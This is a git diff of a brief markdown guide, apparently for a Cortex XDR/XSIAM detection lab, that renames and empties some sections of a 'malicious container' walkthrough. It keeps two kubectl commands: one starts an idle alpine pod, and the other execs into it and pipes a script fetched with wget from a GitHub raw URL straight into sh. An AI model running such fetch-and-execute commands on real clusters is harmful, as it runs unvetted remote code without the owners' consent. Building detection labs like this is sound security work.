@@ -1,7 +1,7 @@
 # Cortex XDR Malicous Container
 
-## Malicous container guide 
-*Outcome* - show capability of grauntlar 
+## Malicous Containers
+* 
 
 
 ## Working Tasks 
@@ -13,11 +13,13 @@
 
 
 
-## Create a container 
+## Dockerhub 
+
+
+
+## Kubectl Quick Deployments 
 
 kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"
-
-## exec into cntainer, donwoad and execute script
 
 kubectl exec -it malicious-container -- /bin/sh -c "wget -qO- https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/malicous-container/malicous-container.sh | sh"
 
